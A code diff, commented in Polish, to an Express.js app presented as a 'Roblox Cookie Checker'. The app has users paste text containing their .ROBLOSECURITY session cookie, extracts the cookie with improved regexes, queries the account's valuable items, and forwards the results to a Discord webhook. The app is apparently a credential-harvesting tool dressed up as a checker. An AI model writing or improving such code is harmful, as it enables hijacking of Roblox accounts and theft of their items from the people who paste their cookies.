@@ -4,9 +4,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ──────────────────────────────────────────────
 // Strona główna – HTML + JS
-// ──────────────────────────────────────────────
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -32,8 +30,8 @@ app.get('/', (req, res) => {
 <body>
 <div class="container">
   <h1>Roblox Cookie Checker (automatyczne wyciąganie)</h1>
-  <p>Wklej dowolny tekst zawierający cookie (logi, konsola, headers, JSON itp.)<br>
-  Wartość zostanie wyciągnięta automatycznie, jeśli jest pomiędzy <code>-and-items.|_</code> i <code>",</code></p>
+  <p>Wklej dowolny tekst zawierający cookie (logi, konsola, headers, JSON, PowerShell itp.)<br>
+  Wartość zostanie wyciągnięta automatycznie, jeśli jest pomiędzy <code>-and-items.|_</code> i <code>"</code> (lub podobnymi markerami)</p>
 
   <textarea id="input" placeholder="Wklej tutaj cały fragment tekstu..."></textarea>
 
@@ -54,15 +52,30 @@ async function check() {
     return;
   }
 
-  // Wyciąganie cookie dokładnie wg Twojego wzorca
-  const regex = /-and-items\\.|_(.+?)(?="\\s*,)/s;
-  const match = raw.match(regex);
-
+  // ──────────────────────────────────────────────
+  // Ulepszony regex – łapie Twój przypadek PowerShell/C#
+  // ──────────────────────────────────────────────
   let cookie = null;
+
+  // Główny wzorzec – -and-items.|_ + wartość aż do najbliższego "
+  let match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
   if (match && match[1]) {
     cookie = match[1].trim();
   }
 
+  // Fallback 1 – szuka po prostu długiego ciągu zaczynającego się od _|WARNING
+  if (!cookie) {
+    match = raw.match(/_\\|WARNING[^"]{200,}/);
+    if (match) cookie = match[0].trim();
+  }
+
+  // Fallback 2 – szuka w cudzysłowach po .ROBLOSECURITY
+  if (!cookie) {
+    match = raw.match(/"\\.ROBLOSECURITY","([^"]+)"/);
+    if (match && match[1]) cookie = match[1].trim();
+  }
+
+  // Ostateczna walidacja
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
     result.innerHTML = '<span class="error">Nie znaleziono poprawnego .ROBLOSECURITY w tekście</span>';
     return;
@@ -86,7 +99,7 @@ async function check() {
       return;
     }
 
-    // Wyświetl wynik na stronie (opcjonalnie)
+    // Wyświetl wynik lokalnie (opcjonalne)
     let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
 
     if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
@@ -117,7 +130,7 @@ async function check() {
 });
 
 // ──────────────────────────────────────────────
-// Endpoint /check – tutaj dzieje się magia + wysyłka na webhook
+// Endpoint /check + wysyłka na webhook
 // ──────────────────────────────────────────────
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
@@ -237,7 +250,7 @@ app.post('/check', async (req, res) => {
     const ampCount = hasGamePasses.filter(id => ampIds.includes(id)).length;
     const sabCount = hasGamePasses.filter(id => sabIds.includes(id)).length;
 
-    // Headless i Korblox (bundle ID jak wcześniej)
+    // Headless i Korblox
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -277,10 +290,8 @@ app.post('/check', async (req, res) => {
       sabCount
     };
 
-    // ──────────────────────────────────────────────
-    // WYSYŁKA NA WEBHOOK DISCORD – tutaj dzieje się to, czego chcesz
-    // ──────────────────────────────────────────────
-    const webhookUrl = process.env.WEBHOOK; // dodaj zmienną środowiskową w Railway
+    // Wysyłka na webhook (jeśli zmienna środowiskowa istnieje)
+    const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
         await fetch(webhookUrl, {
@@ -320,7 +331,7 @@ app.post('/check', async (req, res) => {
                 }
               ],
               footer: {
-                text: "24H! • " + new Date().toLocaleString('en-US')
+                text: "24H! • " + new Date().toLocaleString('pl-PL')
               },
               timestamp: new Date().toISOString()
             }]
@@ -340,6 +351,6 @@ app.post('/check', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
+app.listen(PORT, '0.0.0.0', () => {
   console.log(`Serwer działa na porcie ${PORT}`);
 });
